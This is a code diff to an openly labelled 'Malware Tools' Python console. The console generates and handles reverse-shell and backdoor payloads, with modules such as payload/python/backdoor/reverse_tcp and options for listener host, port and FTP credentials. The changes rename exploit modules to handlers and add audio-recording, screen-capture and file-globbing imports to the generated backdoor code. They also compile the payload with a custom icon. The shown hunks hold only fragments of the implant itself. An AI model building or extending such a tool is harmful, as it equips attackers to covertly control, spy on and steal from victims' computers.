@@ -149,8 +149,8 @@ descrip = '''
             \033[1;91m[ \033[00mGithub : \033[1;91mDxvistxr   \033[1;91m]\033[00m
             \033[1;91m[ \033[00mYoutube : \033[1;91mDavistar  \033[1;91m]\033[00m
             \033[1;91m[ \033[00mInstagram : \033[1;91m0x4eff  \033[1;91m]\033[00m
-            \033[1;91m[ \033[00mVersion : \033[1;91m1.0       \033[1;91m]\033[00m
-                        Malware Tools Beta Test
+            \033[1;91m[ \033[00mVersion : \033[1;91m2.0       \033[1;91m]\033[00m
+                        Malware Tools
 
 '''
 
@@ -172,7 +172,7 @@ def main():
     print(choice_banner_print)
     print(descrip)
     try:
-        readline.set_completer(SimpleCompleter(['help', 'use','show','modules','exit','quit','exploit/','reverse_shell_tcp','backdoor/reverse_tcp','payload/']).complete)
+        readline.set_completer(SimpleCompleter(['help', 'use','show','modules','exit','quit','handler/','python/','backdoor/reverse_tcp','payload/','reverse_shell_tcp']).complete)
         readline.parse_and_bind('tab: complete')
         while True:
             try:
@@ -188,18 +188,21 @@ def main():
                     print('[  show infos              show options          ]')
                     print('[  exit or quit             Exiting Framework    ]')
                     print('[  payload <payload>        Generate Payload     ]')
-                    print('[  exploit <payload>        Run Handler          ]')
+                    print('[  handler <payload>        Run Handler          ]')
                     print('[************************************************]')
+
+                elif command_main.startswith('quit') or command_main.startswith('exit')==True:
+                    sys.exit()
 
                 elif command_main.startswith('show modules')==True:
                     print('[****************Modules********************]')
-                    print('               Exploit                     ')
-                    print('exploit/backdoor/reverse_tcp')
-                    print('exploit/reverse_shell_tcp                  ')
+                    print('               handler                     ')
+                    print('handler/python/backdoor/reverse_tcp         ')
+                    print('handler/reverse_shell_tcp            ')
                     print('\n')
                     print('               Payloads                    ')
-                    print('payload/backdoor/reverse_tcp')
-                    print('payload/reverse_shell_tcp')
+                    print('payload/python/backdoor/reverse_tcp        ')
+                    print('payload/python/reverse_shell_tcp           ')
 
                 elif command_main.startswith('banner')==True:
                     choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
@@ -212,7 +215,7 @@ def main():
                 elif command_main.startswith('clear')==True:
                     clear_os()
 
-                elif command_main.startswith('use exploit/backdoor/reverse_tcp')==True:
+                elif command_main.startswith('use handler/python/backdoor/reverse_tcp')==True:
                     try:
                         readline.set_completer(SimpleCompleter(['show infos','set','lhost','lport','ftpuser','ftppass','ftppath','run','exploit']).complete)
                         readline.parse_and_bind('tab: complete')
@@ -302,7 +305,7 @@ def main():
                     except Exception as error_backdoor_reverse_tcp:
                         print(error_backdoor_reverse_tcp)
 
-                elif command_main.startswith('use exploit/reverse_shell_tcp')==True:
+                elif command_main.startswith('use handler/reverse_shell_tcp')==True:
                     try:
                         readline.set_completer(SimpleCompleter(['show infos','set','lhost','lport','run','exploit']).complete)
                         readline.parse_and_bind('tab: complete')
@@ -369,7 +372,7 @@ def main():
                     except Exception as error_reverse_shell_tcp:
                         print(error_reverse_shell_tcp)
 
-                elif command_main.startswith('use payload/reverse_shell_tcp')==True:
+                elif command_main.startswith('use payload/python/reverse_shell_tcp')==True:
                     try:
                         readline.set_completer(SimpleCompleter(['show infos','shell_env','quit','show shell','set','lhost','name','lport','generate']).complete)
                         readline.parse_and_bind('tab: complete')
@@ -787,7 +790,7 @@ def main():
                     except Exception as error_run_shell:
                         print(error_run_shell)
 
-                elif command_main.startswith('use payload/backdoor/reverse_tcp')==True:
+                elif command_main.startswith('use payload/python/backdoor/reverse_tcp')==True:
                     try:
                         readline.set_completer(SimpleCompleter(['show infos','platform','set','lhost','name','lport','ftpuser','ftppass','log_dir','generate']).complete)
                         readline.parse_and_bind('tab: complete')
@@ -966,11 +969,16 @@ def main():
                                                         f.write('import netifaces\n')
                                                         f.write('import pyttsx3\n')
                                                         f.write('import ctypes\n')
+                                                        f.write('import glob\n')
+                                                        f.write('import pyaudio\n')
+                                                        f.write('import wave\n')
                                                         f.write('\n')
                                                         f.write("if 'Linux' not in platform.platform():\n")
                                                         f.write("    import win32con\n")
                                                         f.write("    from PIL import ImageGrab\n")
                                                         f.write("    from PIL import Image\n")
+                                                        f.write("    import pyautogui\n")
+                                                        f.write("    import imutils\n")
                                                         f.write("elif 'Windows' not in platform.platform():\n")
                                                         f.write("    import pyautogui\n")
                                                         f.write("    import imutils\n")
@@ -1016,11 +1024,16 @@ def main():
                                                         f.write('import netifaces\n')
                                                         f.write('import pyttsx3\n')
                                                         f.write('import ctypes\n')
+                                                        f.write('import glob\n')
+                                                        f.write('import pyaudio\n')
+                                                        f.write('import wave\n')
                                                         f.write('\n')
                                                         f.write("if 'Linux' not in platform.platform():\n")
                                                         f.write("    import win32con\n")
                                                         f.write("    from PIL import ImageGrab\n")
                                                         f.write("    from PIL import Image\n")
+                                                        f.write("    import pyautogui\n")
+                                                        f.write("    import imutils\n")
                                                         f.write("elif 'Windows' not in platform.platform():\n")
                                                         f.write("    import pyautogui\n")
                                                         f.write("    import imutils\n")
@@ -1071,11 +1084,16 @@ def main():
                                                         f.write('import netifaces\n')
                                                         f.write('import pyttsx3\n')
                                                         f.write('import ctypes\n')
+                                                        f.write('import glob\n')
+                                                        f.write('import pyaudio\n')
+                                                        f.write('import wave\n')
                                                         f.write('\n')
                                                         f.write("if 'Linux' not in platform.platform():\n")
                                                         f.write("    import win32con\n")
                                                         f.write("    from PIL import ImageGrab\n")
                                                         f.write("    from PIL import Image\n")
+                                                        f.write("    import pyautogui\n")
+                                                        f.write("    import imutils\n")
                                                         f.write("elif 'Windows' not in platform.platform():\n")
                                                         f.write("    import pyautogui\n")
                                                         f.write("    import imutils\n")
@@ -1149,11 +1167,16 @@ def main():
                                                 f.write('import netifaces\n')
                                                 f.write('import pyttsx3\n')
                                                 f.write('import ctypes\n')
+                                                f.write('import glob\n')
+                                                f.write('import pyaudio\n')
+                                                f.write('import wave\n')
                                                 f.write('\n')
                                                 f.write("if 'Linux' not in platform.platform():\n")
                                                 f.write("    import win32con\n")
                                                 f.write("    from PIL import ImageGrab\n")
                                                 f.write("    from PIL import Image\n")
+                                                f.write("    import pyautogui\n")
+                                                f.write("    import imutils\n")
                                                 f.write("elif 'Windows' not in platform.platform():\n")
                                                 f.write("    import pyautogui\n")
                                                 f.write("    import imutils\n")
@@ -1199,11 +1222,16 @@ def main():
                                                 f.write('import netifaces\n')
                                                 f.write('import pyttsx3\n')
                                                 f.write('import ctypes\n')
+                                                f.write('import glob\n')
+                                                f.write('import pyaudio\n')
+                                                f.write('import wave\n')
                                                 f.write('\n')
                                                 f.write("if 'Linux' not in platform.platform():\n")
                                                 f.write("    import win32con\n")
                                                 f.write("    from PIL import ImageGrab\n")
                                                 f.write("    from PIL import Image\n")
+                                                f.write("    import pyautogui\n")
+                                                f.write("    import imutils\n")
                                                 f.write("elif 'Windows' not in platform.platform():\n")
                                                 f.write("    import pyautogui\n")
                                                 f.write("    import imutils\n")
@@ -1254,11 +1282,16 @@ def main():
                                                 f.write('import netifaces\n')
                                                 f.write('import pyttsx3\n')
                                                 f.write('import ctypes\n')
+                                                f.write('import glob\n')
+                                                f.write('import pyaudio\n')
+                                                f.write('import wave\n')
                                                 f.write('\n')
                                                 f.write("if 'Linux' not in platform.platform():\n")
                                                 f.write("    import win32con\n")
                                                 f.write("    from PIL import ImageGrab\n")
                                                 f.write("    from PIL import Image\n")
+                                                f.write("    import pyautogui\n")
+                                                f.write("    import imutils\n")
                                                 f.write('\n')
                                                 f.write("elif 'Windows' not in platform.platform():\n")
                                                 f.write("    import pyautogui\n")
@@ -1278,6 +1311,7 @@ def main():
                                                     if icon =='yes':
                                                         icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                         print('[*] Wait Moment Please Generating Payload !')
+                                                        
                                                         os.system('python2 pyinstaller/pyinstaller.py -F  -i %s -n %s.elf %s.py' % (icon_ico,NAME,NAME))
                                                         print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))
 
@@ -1300,9 +1334,6 @@ def main():
 
                     except Exception as error_backdoor_reverse_tcp:
                         print(error_backdoor_reverse_tcp)
-
-                elif command_main.startswith('quit') or command_main.startswith('exit')==True:
-                    sys.exit()
 
                 else:
                     print('[!] Command Not Found !')
